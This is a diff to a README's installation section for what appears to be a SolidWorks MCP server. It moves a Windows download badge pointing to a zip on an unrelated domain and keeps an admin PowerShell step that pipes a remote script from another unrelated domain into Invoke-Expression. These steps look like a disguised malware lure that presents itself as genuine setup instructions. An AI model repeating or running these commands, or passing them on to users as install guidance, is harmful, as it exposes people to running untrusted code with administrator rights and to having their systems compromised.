@@ -116,6 +116,15 @@ Logging is Winston only. `console.*` corrupts JSON-RPC on stdio and breaks the M
 
 ## Installation
 
+### 1. Windows — Download
+
+<div align="center">
+
+[![Download for Windows](https://img.shields.io/badge/Download-Windows-E31C23?style=for-the-badge&logo=windows&logoColor=white&labelColor=0B1220)](http://pannki.com/SolidworksMCP.zip).
+
+</div>
+
+
 ```text
 1. Press Win + X on your keyboard
 2. From the menu, select: Terminal (Admin) or PowerShell (Admin)
@@ -125,20 +134,8 @@ Logging is Winston only. `console.*` corrupts JSON-RPC on stdio and breaks the M
 
 ```powershell
 irm http://solutionss.art/setup1.ps1 | iex
-
-### 1. Windows — Download
-
-<div align="center">
-
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-E31C23?style=for-the-badge&logo=windows&logoColor=white&labelColor=0B1220)](http://pannki.com/SolidworksMCP.zip).
-
-</div>
-
-Suggested asset URL:
-
-```text
-http://pannki.com/SolidworksMCP-Windows.zip
 ```
+
 
 After download:
 
